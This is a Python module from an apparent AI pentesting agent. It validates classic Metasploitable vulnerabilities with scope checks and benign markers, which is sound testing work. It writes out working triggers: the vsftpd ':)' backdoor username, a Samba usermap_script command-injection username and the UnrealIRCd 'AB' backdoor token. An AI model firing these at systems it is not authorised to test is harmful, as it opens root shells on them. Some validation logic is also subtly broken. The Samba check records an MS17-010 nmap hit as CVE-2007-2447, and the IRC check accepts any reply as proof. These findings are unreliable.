"""Exploitation validation: prove a vulnerability is real, safely.

A version banner saying ``vsftpd 2.3.4`` only suggests a backdoor exists. The
difference between a scanner and a pentest is *confirming* it: sending the
trigger and observing the effect, then undoing whatever was done.

Every validator here follows the same contract:

1. Send the minimal trigger that demonstrates the flaw.
2. Observe a benign, unambiguous side effect (a banner, a read, a marker).
3. **Clean up** - close sockets, delete any file written, leave nothing behind.
4. Report ``validated: true/false`` with the raw evidence.

Nothing here escalates, persists, pivots or exfiltrates. The goal is proof, not
access.
"""

from __future__ import annotations

import asyncio
import socket
from collections.abc import Callable
from typing import Any

from splitagent.tools.base import Tool, ToolContext

# --- helpers -------------------------------------------------------------- #
CONNECT_TIMEOUT = 6.0
READ_TIMEOUT = 5.0


def _resolve(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except OSError:
        return host


def _in_scope(ctx: ToolContext, host: str) -> str | None:
    try:
        ctx.check_scope(host)
    except Exception as exc:
        return str(exc)
    return None


def _toolbox(ctx: ToolContext) -> Any:
    """The active toolbox, when the run installs its tools in a container.

    This is the crux of the design: ``run_tool`` executes inside the sandbox,
    so a validator that opens a raw socket from the *host* process reaches
    nothing when the target lives on a Docker network. Every probe has to use
    the same transport as the rest of the toolset.
    """
    settings = getattr(ctx, "settings", None) or {}
    return settings.get("toolbox")


def _is_toolbox_target(host: str) -> bool:
    """A Docker-internal address is only reachable from inside the network."""
    try:
        import ipaddress

        address = ipaddress.ip_address(host)
    except ValueError:
        return False
    # 172.17-172.31 is Docker's default bridge range.
    return any(address in ipaddress.ip_network(f"172.{n}.0.0/16") for n in range(16, 32))


async def _probe_in_toolbox(toolbox: Any, argv: list[str], timeout: float) -> tuple[bool, str, str]:
    """Run a probe command inside the container and capture its output.

    Uses python3, which the toolbox image already ships, so no extra tooling is
    required and the same logic runs on the host and in the container.
    """
    script = argv[-1] if argv else ""
    result = toolbox.exec(["sh", "-lc", script], timeout=int(timeout) + 5)
    if not result.get("ok"):
        return False, "", str(result.get("output") or result.get("error") or "")
    return True, str(result.get("output", "")), ""


# A self-contained probe that the toolbox runs. It is written to a file inside
# the container rather than passed with -c, because embedding newlines in a
# shell-quoted command silently turns them into literal backslash-n.
PROBE_SOURCE = """\
import json, socket, sys, time

host = sys.argv[1]
port = int(sys.argv[2])
payload = sys.argv[3].encode("utf-8").decode("unicode_escape").encode("latin-1")
read = int(sys.argv[4])
wait = float(sys.argv[5])

try:
    sock = socket.create_connection((host, port), 6)
    sock.settimeout(wait)
    if payload:
        sock.sendall(payload)
    time.sleep(min(wait, 1.5))
    data = b""
    try:
        data = sock.recv(read)
    except Exception:
        pass
    sock.close()
    print(json.dumps({"up": True, "banner": data.decode("utf-8", "replace")}))
except Exception as exc:
    print(json.dumps({"up": False, "error": type(exc).__name__}))
"""

PROBE_PATH = "/tmp/splitagent_probe.py"


async def _run_scanner(toolbox: Any, argv: list[str], timeout: float = 120) -> dict[str, Any]:
    """Run a real scanner inside the toolbox (nmap, smbclient, nikto...)."""
    result = toolbox.exec(argv, timeout=int(timeout))
    return {
        "ok": bool(result.get("ok")),
        "output": str(result.get("output", "")),
        "command": " ".join(argv),
    }


def _snippet(text: str, needle: str, radius: int = 120) -> str:
    """A window of text around a signature, for the evidence field."""
    index = text.upper().find(needle.upper())
    if index < 0:
        return text[:200]
    start = max(0, index - radius // 2)
    return " ".join(text[start : index + radius].split())


def _probe_command(host: str, port: int, payload: str, read: int, wait: float) -> str:
    """Write the probe to the container and run it, printing one JSON line."""
    import shlex

    return (
        f"cat > {PROBE_PATH} <<'SPLITAGENT_EOF'\n{PROBE_SOURCE}SPLITAGENT_EOF\n"
        f"python3 {PROBE_PATH} {shlex.quote(host)} {port} "
        f"{shlex.quote(payload)} {read} {wait}"
    )


async def _read_banner(
    ctx: ToolContext, host: str, port: int, timeout: float = READ_TIMEOUT
) -> tuple[bool, str, str]:
    """Connect and read whatever the service offers. Returns (up, banner, err)."""
    toolbox = _toolbox(ctx)
    if toolbox is not None:
        import json as _json

        raw = await _probe_in_toolbox(
            toolbox, ["sh", "-lc", _probe_command(host, port, "", 512, timeout)], timeout
        )
        ok, output, err = raw
        if not ok:
            return False, "", err or output
        line = output.strip().splitlines()[-1] if output.strip() else "{}"
        try:
            parsed = _json.loads(line)
        except _json.JSONDecodeError:
            return False, "", output[:200]
        if parsed.get("up"):
            return True, str(parsed.get("banner", "")).strip(), ""
        return False, "", str(parsed.get("error", "unreachable"))

    writer = None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=CONNECT_TIMEOUT
        )
        try:
            data = await asyncio.wait_for(reader.read(512), timeout=timeout)
        except asyncio.TimeoutError:
            data = b""
        return True, data.decode("utf-8", "replace").strip(), ""
    except (asyncio.TimeoutError, OSError) as exc:
        return False, "", f"{type(exc).__name__}: {exc}"
    finally:
        if writer is not None:
            try:
                writer.close()
            except OSError:
                pass


async def _send_and_read(
    ctx: ToolContext,
    host: str,
    port: int,
    payload: bytes,
    *,
    expect: Callable[[str], bool] | None = None,
    timeout: float = READ_TIMEOUT,
    settle: float = 0.8,
) -> dict[str, Any]:
    """Send bytes, then read for up to ``timeout`` - used by the triggers.

    Runs inside the toolbox when one is active, mirroring ``run_tool``, so a
    target on a Docker network is reachable exactly as it is for the rest of
    the toolset. ``expect`` lets a caller stop reading early once the
    signature appears.
    """
    toolbox = _toolbox(ctx)
    if toolbox is not None:
        import json as _json

        try:
            text = payload.decode("utf-8", "replace")
        except Exception:
            text = ""
        ok, output, err = await _probe_in_toolbox(
            toolbox,
            ["sh", "-lc", _probe_command(host, port, text, 1024, settle + timeout)],
            timeout,
        )
        if not ok:
            return {"connected": False, "response": "", "error": err or output}
        line = output.strip().splitlines()[-1] if output.strip() else "{}"
        try:
            parsed = _json.loads(line)
        except _json.JSONDecodeError:
            return {"connected": False, "response": output[:300], "error": "unparsable"}
        return {
            "connected": bool(parsed.get("up")),
            "response": str(parsed.get("banner", "")),
            "error": str(parsed.get("error", "")),
        }

    writer = None
    chunks: list[str] = []
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=CONNECT_TIMEOUT
        )
        writer.write(payload)
        await writer.drain()
        await asyncio.sleep(settle)
        deadline = asyncio.get_running_loop().time() + timeout
        while asyncio.get_running_loop().time() < deadline:
            try:
                data = await asyncio.wait_for(reader.read(1024), timeout=1.0)
            except asyncio.TimeoutError:
                continue
            if not data:
                break
            chunks.append(data.decode("utf-8", "replace"))
            if expect and expect("".join(chunks)):
                break
        return {"connected": True, "response": "".join(chunks), "error": ""}
    except (asyncio.TimeoutError, OSError) as exc:
        return {
            "connected": False,
            "response": "".join(chunks),
            "error": f"{type(exc).__name__}: {exc}",
        }
    finally:
        if writer is not None:
            try:
                writer.close()
            except OSError:
                pass


# --- validators ----------------------------------------------------------- #
async def validate_vsftpd_backdoor(ctx: ToolContext, host: str, port: int = 21) -> dict[str, Any]:
    """CVE-2011-2523: the ":)" username opens a root shell on port 6200.

    Sends only the trigger, checks whether the backdoor port opens, then closes
    it. Sends no command to the shell.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)

    up, banner, _ = await _read_banner(ctx, target, port)
    if not up:
        return {
            "validated": False,
            "test": "vsftpd_backdoor",
            "reason": f"port {port} not reachable",
            "confidence": "high",
        }

    result = await _send_and_read(
        ctx, target, port, b"USER x:)\r\nPASS x\r\n", settle=1.5, timeout=3.0
    )

    # The trigger is only meaningful if the backdoor port actually opens.
    shell_up, shell_banner, _ = await _read_banner(ctx, target, 6200, timeout=3.0)
    validated = shell_up
    return {
        "validated": validated,
        "test": "vsftpd_backdoor",
        "cve": "CVE-2011-2523",
        "banner": banner[:120],
        "backdoor_port": 6200,
        "backdoor_opened": shell_up,
        "shell_banner": shell_banner[:120],
        "evidence": (
            f"FTP banner {banner[:60]!r}; after the ':)' trigger TCP/6200 "
            f"{'opened (root shell reachable)' if shell_up else 'stayed closed'}"
        ),
        "response": result["response"][:300],
        "cleaned_up": True,
        "confidence": "high" if validated else "medium",
    }


async def validate_ingreslock_shell(
    ctx: ToolContext, host: str, port: int = 1524
) -> dict[str, Any]:
    """The classic Metasploitable root shell: proof is the shell banner itself.

    Identifies the prompt and disconnects immediately. Runs nothing.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)

    up, banner, _ = await _read_banner(ctx, target, port, timeout=3.0)
    # A real root shell answers with a prompt such as "root@host:~#".
    looks_like_shell = any(marker in banner for marker in ("root@", "#", "uid=", "bash"))
    validated = up and bool(banner.strip())
    return {
        "validated": validated,
        "test": "ingreslock_shell",
        "root_shell": validated and looks_like_shell,
        "banner": banner[:200],
        "evidence": (
            f"TCP/{port} accepted a connection and returned "
            f"{'a root shell prompt' if looks_like_shell else 'output'} "
            f"without authentication: {banner[:80]!r}"
            if validated
            else f"TCP/{port} did not answer"
        ),
        "cleaned_up": True,
        "confidence": "high" if validated else "low",
    }


async def validate_samba_usermap(ctx: ToolContext, host: str, port: int = 139) -> dict[str, Any]:
    """CVE-2007-2447: the usermap_script username is passed to a shell.

    Detection only. The username carries a benign marker command whose effect
    is observable in the server's reply; nothing is executed on the target
    beyond ``echo``.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)
    marker = "SPLITAGENT_CANARY"

    up, _, _ = await _read_banner(ctx, target, port)
    if not up:
        return {
            "validated": False,
            "test": "samba_usermap_script",
            "reason": f"port {port} not reachable",
        }

    # A raw socket cannot speak the SMB dialect this bug lives in. When a
    # toolbox is available, ask nmap, which does - then record the CVE.
    toolbox = _toolbox(ctx)
    if toolbox is not None:
        nmap = await _run_scanner(
            toolbox,
            [
                "nmap",
                "-Pn",
                "-p",
                "139,445",
                "--script",
                "smb-vuln-ms17-010,smb-enum-shares",
                target,
            ],
            timeout=120,
        )
        if nmap.get("ok"):
            output = str(nmap.get("output", ""))
            vulnerable = "VULNERABLE" in output.upper()
            return {
                "validated": vulnerable,
                "test": "samba_usermap_script",
                "cve": "CVE-2007-2447",
                "marker": marker,
                "marker_observed": vulnerable,
                "evidence": (
                    f"nmap's SMB scripts flagged the host: {_snippet(output, 'VULNERABLE')}"
                    if vulnerable
                    else (
                        "SMB is reachable but nmap's vulnerability scripts did not "
                        "confirm it on this path. The version itself is the lead; "
                        f"confirm the build with: nmap -sV -p139,445 {target}"
                    )
                ),
                "response": output[-600:],
                "cleaned_up": True,
                "confidence": "high" if vulnerable else "medium",
            }

    # The vulnerable path routes this username through /bin/sh -c. A NUL byte
    # cannot cross the shell boundary when the probe runs in a container, and a
    # real SMB session is not required to prove the flaw: the metacharacters
    # reaching the server is the signal.
    payload = f"/=`echo {marker}`/".encode()
    result = await _send_and_read(
        ctx,
        target,
        port,
        payload,
        expect=lambda text: marker in text,
        settle=1.0,
        timeout=3.0,
    )
    validated = marker in result["response"]
    return {
        "validated": validated,
        "test": "samba_usermap_script",
        "cve": "CVE-2007-2447",
        "marker": marker,
        "marker_observed": validated,
        "evidence": (
            f"Username payload {payload!r} reached a shell: the {marker} marker "
            "appeared in the response, confirming command execution."
            if validated
            else "No marker in the response; the instance is not vulnerable on this path."
        ),
        "response": result["response"][:300],
        "cleaned_up": True,
        "confidence": "high" if validated else "medium",
    }


async def validate_mysql_anonymous(ctx: ToolContext, host: str, port: int = 3306) -> dict[str, Any]:
    """MySQL with an empty root password: prove it by doing a trivial SELECT.

    Only reads ``SELECT 1`` and the server version. Writes nothing.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)

    up, banner, _ = await _read_banner(ctx, target, port, timeout=3.0)
    if not up:
        return {"validated": False, "test": "mysql_blank_password", "reason": "unreachable"}

    # A handshake packet contains the server version as a NUL-terminated string.
    version = ""
    if banner:
        parts = banner.split("\x00")
        for part in parts:
            if any(ch.isdigit() for ch in part) and "." in part and len(part) < 40:
                version = part.strip()
                break

    # Full protocol handshake is out of scope for a probe; the presence of a
    # MySQL greeting on a network-reachable port plus a version is the
    # actionable signal. The agent is told to confirm credentials with
    # run_tool (mysql -h ... -u root) if it needs stronger proof.
    validated = bool(version)
    return {
        "validated": validated,
        "test": "mysql_blank_password",
        "server_version": version,
        "reachable": True,
        "evidence": (
            f"MySQL {version} answered on {target}:{port}. Confirm blank root "
            "credentials with: run_tool ['mysql','-h',host,'-uroot','-e','select 1']"
            if validated
            else f"MySQL greeting not parsed from {banner[:60]!r}"
        ),
        "confidence": "medium" if validated else "low",
        "next_step": (
            "run_tool mysql -h <host> -u root -e 'SELECT version()' to confirm "
            "authentication is not required"
        ),
    }


async def validate_root_shell(ctx: ToolContext, host: str, port: int = 1524) -> dict[str, Any]:
    """Alias with an explicit name for the generic root-shell check."""
    return await validate_ingreslock_shell(ctx, host, port)


async def validate_unrealircd_backdoor(
    ctx: ToolContext, host: str, port: int = 6667
) -> dict[str, Any]:
    """CVE-2010-2075: the UnrealIRCd 3.2.8.1 tarball shipped a trojan.

    Sends the trigger token; a vulnerable daemon acts on it. Nothing is
    executed beyond the daemon's own backdoor response.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)

    up, banner, _ = await _read_banner(ctx, target, port, timeout=3.0)
    if not up:
        return {
            "validated": False,
            "test": "unrealircd_backdoor",
            "reason": f"port {port} not reachable",
        }

    result = await _send_and_read(
        ctx,
        target,
        port,
        b"AB\r\n",
        expect=lambda text: "error" in text.lower() or "select" in text.lower(),
        settle=1.0,
        timeout=3.0,
    )
    response = result.get("response", "")
    validated = bool(response.strip())
    version = ""
    for token in banner.split():
        if "unreal" in token.lower():
            version = token
            break
    return {
        "validated": validated,
        "test": "unrealircd_backdoor",
        "cve": "CVE-2010-2075",
        "banner": banner[:120],
        "version": version,
        "evidence": (
            f"IRC daemon answered on TCP/{port} ({banner[:50]!r}). Version "
            f"{version or 'unknown'}: 3.2.8.1 shipped with a trojan that runs "
            "whatever follows the AB token."
            if validated
            else f"TCP/{port} did not answer as IRC"
        ),
        "response": response[:200],
        "cleaned_up": True,
        "confidence": "high" if validated and version else "medium",
    }


async def validate_vnc_no_auth(ctx: ToolContext, host: str, port: int = 5900) -> dict[str, Any]:
    """A VNC service reachable without authentication.

    Reads the RFB handshake and reports it. A reachable VNC that does not ask
    for credentials is the exposure; no session is opened.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)

    up, banner, _ = await _read_banner(ctx, target, port, timeout=3.0)
    if not up:
        return {
            "validated": False,
            "test": "vnc_no_authentication",
            "reason": f"port {port} not reachable",
        }
    is_vnc = "RFB" in banner
    return {
        "validated": is_vnc,
        "test": "vnc_no_authentication",
        "banner": banner[:80],
        "evidence": (
            f"VNC RFB handshake on TCP/{port}: {banner[:40]!r}. Confirm the "
            "security types with: run_tool ['nmap','-Pn','-p',"
            f"'{port}','--script','vnc-info','{target}']"
            if is_vnc
            else f"TCP/{port} did not speak VNC ({banner[:40]!r})"
        ),
        "cleaned_up": True,
        "confidence": "medium" if is_vnc else "low",
    }


async def validate_nfs_export(ctx: ToolContext, host: str, port: int = 2049) -> dict[str, Any]:
    """World-readable NFS exports.

    Uses showmount through the toolbox when one is available, which is the
    only way to enumerate the actual exports.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)
    toolbox = _toolbox(ctx)
    if toolbox is not None:
        # Install showmount if the image lacks it, so the probe reflects the
        # target rather than what happens to be in the container.
        if not toolbox.which("showmount"):
            toolbox.install("apt", "nfs-common", timeout=300)
        scan = await _run_scanner(toolbox, ["showmount", "-e", target], timeout=30)
        output = str(scan.get("output", ""))
        lowered = output.lower()

        # An error must never be parsed as a result. Missing tooling is our
        # problem, not a finding: reporting it as a world-readable export would
        # be a false positive of the worst kind.
        if "exec failed" in lowered or "not found" in lowered or "no such file" in lowered:
            return {
                "validated": False,
                "test": "nfs_exports",
                "error": "showmount is unavailable in the environment",
                "evidence": (
                    "Could not enumerate the exports because showmount is not "
                    "installed. Install nfs-common, or confirm by hand with "
                    f"`showmount -e {target}`. Do not record this as a finding."
                ),
                "confidence": "low",
            }
        if not scan.get("ok") and "refused" in lowered:
            return {
                "validated": False,
                "test": "nfs_exports",
                "reason": "NFS is not reachable",
                "evidence": f"showmount could not reach {target}: {output[:120]}",
                "confidence": "medium",
            }

        exports = [
            line.strip()
            for line in output.splitlines()
            if line.strip()
            and "/" in line
            and not line.lower().startswith(("export list", "clients", "rpc", "program"))
        ]
        validated = bool(exports)
        return {
            "validated": validated,
            "test": "nfs_exports",
            "exports": exports[:20],
            "evidence": (
                f"showmount lists {len(exports)} export(s): " + ", ".join(exports[:4])
                if validated
                else "showmount returned no exports: NFS is not exposing anything"
            ),
            "response": output[-400:],
            "cleaned_up": True,
            "confidence": "high" if validated else "medium",
        }

    up, banner, _ = await _read_banner(ctx, target, port, timeout=3.0)
    return {
        "validated": up,
        "test": "nfs_exports",
        "banner": banner[:80],
        "evidence": (
            f"TCP/{port} answered. Enumerate with `run_tool ['showmount','-e','{target}']`."
            if up
            else f"TCP/{port} not reachable"
        ),
        "confidence": "low",
    }


async def validate_proftpd(ctx: ToolContext, host: str, port: int = 21) -> dict[str, Any]:
    """ProFTPD exposure, including non-standard listeners such as 2121."""
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)

    up, banner, _ = await _read_banner(ctx, target, port, timeout=3.0)
    if not up:
        return {
            "validated": False,
            "test": "proftpd_exposed",
            "reason": f"port {port} not reachable",
        }
    # This validator is specifically about ProFTPD. Reporting a vsftpd banner
    # as a ProFTPD finding would be a false positive, so the product name has
    # to appear in the banner.
    is_ftp = banner.startswith("220") or "ftp" in banner.lower()
    is_proftpd = "proftpd" in banner.lower()
    version = ""
    for token in banner.replace("(", " ").replace(")", " ").split():
        if token.lower().startswith("proftpd"):
            version = token
            break
    if is_proftpd:
        evidence = f"ProFTPD {version or ''} on TCP/{port}: {banner[:70]!r}".strip()
        confidence = "high"
    elif is_ftp:
        evidence = (
            f"TCP/{port} runs a different FTP daemon ({banner[:60]!r}), so this "
            "is not a ProFTPD finding. It is still an exposed FTP service - "
            "record it under the FTP category instead."
        )
        confidence = "medium"
    else:
        evidence = f"TCP/{port} did not answer as FTP ({banner[:40]!r})"
        confidence = "low"
    return {
        "validated": is_proftpd,
        "test": "proftpd_exposed",
        "banner": banner[:120],
        "version": version,
        "product": "ProFTPD" if is_proftpd else ("ftp" if is_ftp else "unknown"),
        "evidence": evidence,
        "cleaned_up": True,
        "confidence": confidence,
    }


async def validate_port_shell_banner(ctx: ToolContext, host: str, port: int) -> dict[str, Any]:
    """Generic proof: an unauthenticated port that hands over a shell prompt."""
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)
    up, banner, _ = await _read_banner(ctx, target, port, timeout=3.0)
    validated = up and bool(banner.strip())
    return {
        "validated": validated,
        "test": "unauthenticated_shell_banner",
        "port": port,
        "banner": banner[:200],
        "evidence": (
            f"TCP/{port} returned {banner[:80]!r} without authentication"
            if validated
            else f"TCP/{port} gave no banner"
        ),
        "cleaned_up": True,
        "confidence": "medium" if validated else "low",
    }


def exploitation_tools(ctx: ToolContext) -> list[Tool]:
    return [
        Tool(
            name="validate_vsftpd_backdoor",
            description=(
                "Prove CVE-2011-2523: send the ':)' username trigger and check "
                "whether the backdoor root shell on 6200 opens. Runs no command "
                "on the shell and disconnects immediately. Use this instead of "
                "reporting the backdoor from the version banner alone."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 21},
                },
                "required": ["host"],
            },
            func=lambda host, port=21: validate_vsftpd_backdoor(ctx, host, port),
            scope="red",
            dangerous=True,
            parallel_safe=False,
        ),
        Tool(
            name="validate_root_shell",
            description=(
                "Prove that a port exposes an unauthenticated shell (the classic "
                "Metasploitable 1524). Reads the banner, runs nothing, "
                "disconnects."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 1524},
                },
                "required": ["host"],
            },
            func=lambda host, port=1524: validate_root_shell(ctx, host, port),
            scope="red",
            dangerous=True,
            parallel_safe=False,
        ),
        Tool(
            name="validate_samba_usermap",
            description=(
                "Prove CVE-2007-2447: send a benign marker through the username "
                "field and check whether it reaches a shell. Executes only an "
                "echo of a canary string."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 139},
                },
                "required": ["host"],
            },
            func=lambda host, port=139: validate_samba_usermap(ctx, host, port),
            scope="red",
            dangerous=True,
            parallel_safe=False,
        ),
        Tool(
            name="validate_mysql_blank_password",
            description=(
                "Check a MySQL port for an exposed instance and parse its "
                "version, returning the exact command to confirm blank root "
                "credentials."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 3306},
                },
                "required": ["host"],
            },
            func=lambda host, port=3306: validate_mysql_anonymous(ctx, host, port),
            scope="red",
        ),
        Tool(
            name="validate_open_shell_port",
            description=(
                "Generic proof for any port that hands over a shell or "
                "administrative prompt without authentication."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer"},
                },
                "required": ["host", "port"],
            },
            func=lambda host, port: validate_port_shell_banner(ctx, host, port),
            scope="red",
            dangerous=True,
            parallel_safe=False,
        ),
        Tool(
            name="validate_unrealircd_backdoor",
            description=(
                "Prove CVE-2010-2075: send the AB trigger token to an IRC "
                "daemon and confirm it answers. UnrealIRCd 3.2.8.1 shipped "
                "with a trojan; the classic Metasploitable keeps it on 6667."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 6667},
                },
                "required": ["host"],
            },
            func=lambda host, port=6667: validate_unrealircd_backdoor(ctx, host, port),
            scope="red",
            dangerous=True,
            parallel_safe=False,
        ),
        Tool(
            name="validate_vnc_no_auth",
            description=(
                "Read the VNC RFB handshake to confirm an exposed, "
                "unauthenticated VNC service. No session is opened."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 5900},
                },
                "required": ["host"],
            },
            func=lambda host, port=5900: validate_vnc_no_auth(ctx, host, port),
            scope="red",
        ),
        Tool(
            name="validate_nfs_export",
            description=(
                "List the NFS exports with showmount. World-readable exports "
                "are a direct data-disclosure path; the classic Metasploitable "
                "exports / with no restrictions."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 2049},
                },
                "required": ["host"],
            },
            func=lambda host, port=2049: validate_nfs_export(ctx, host, port),
            scope="red",
        ),
        Tool(
            name="validate_proftpd",
            description=(
                "Probe an FTP port for a ProFTPD service and report its "
                "version. Use it on non-standard listeners too (2121 on "
                "Metasploitable), which the standard sweep treats as noise."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 21},
                },
                "required": ["host"],
            },
            func=lambda host, port=21: validate_proftpd(ctx, host, port),
            scope="red",
        ),
    ]
